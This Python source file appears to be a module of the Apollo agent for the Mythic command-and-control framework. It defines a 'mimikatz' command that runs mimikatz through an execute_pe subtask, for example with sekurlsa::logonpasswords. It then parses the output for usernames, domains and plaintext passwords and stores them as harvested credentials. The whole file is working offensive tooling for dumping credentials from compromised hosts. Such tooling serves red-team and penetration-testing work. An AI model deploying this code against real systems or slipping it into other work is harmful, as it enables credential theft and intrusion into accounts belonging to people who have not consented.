from mythic_container.MythicCommandBase import *
import json
from uuid import uuid4
from apollo.mythic.sRDI import ShellcodeRDI
from os import path
from mythic_container.MythicRPC import *
import base64
import sys

class MimikatzArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # CommandParameter(
            #     name="command",
            #     cli_name="Command",
            #     display_name="Command(s)", 
            #     type=ParameterType.String, 
            #     description="Mimikatz command to run (can be one or more)."),
        ]

    async def parse_arguments(self):
        if len(self.command_line):
            self.add_arg("command", "mimikatz.exe {}".format(self.command_line))
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(MimikatzCommand.help_cmd))


async def parse_credentials(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID))
    for output in responses.Responses:
        mimikatz_out = str(output.Response)
        comment = "task {}".format(output.TaskID)
        if mimikatz_out != "":
            lines = mimikatz_out.split("\r\n")

            for i in range(len(lines)):
                line = lines[i]
                if "Username" in line:
                    # Check to see if Password is null
                    if i+2 >= len(lines):
                        break
                    uname = line.split(" : ")[1].strip()
                    realm = lines[i+1].split(" : ")[1].strip()
                    passwd = lines[i+2].split(" : ")[1].strip()
                    if passwd != "(null)":
                        cred_resp = await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                            TaskID=task.SubtaskData.Task.ID,
                            Credentials=[MythicRPCCredentialData(
                                credential_type="plaintext",
                                account=uname,
                                realm=realm,
                                credential=passwd,
                                comment=comment
                            )]
                        ))
                        if not cred_resp.Success:
                            raise Exception("Failed to register credential")
    return response

class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    attributes=CommandAttributes(
        dependencies=["execute_pe"]
    )
    needs_admin = False
    help_cmd = "mimikatz [command1] [command2] [...]"
    description = "Execute one or more mimikatz commands (e.g. `mimikatz coffee sekurlsa::logonpasswords`)."
    version = 2
    author = "@djhohnstein"
    argument_class = MimikatzArguments
    attackmapping = ["T1134", "T1098", "T1547", "T1555", "T1003", "T1207", "T1558", "T1552", "T1550"]
    script_only = True
    completion_functions = {"parse_credentials": parse_credentials}


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=taskData.Task.ID,
            CommandName="execute_pe",
            Params=taskData.args.get_arg("command"),
            SubtaskCallbackFunction="parse_credentials"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

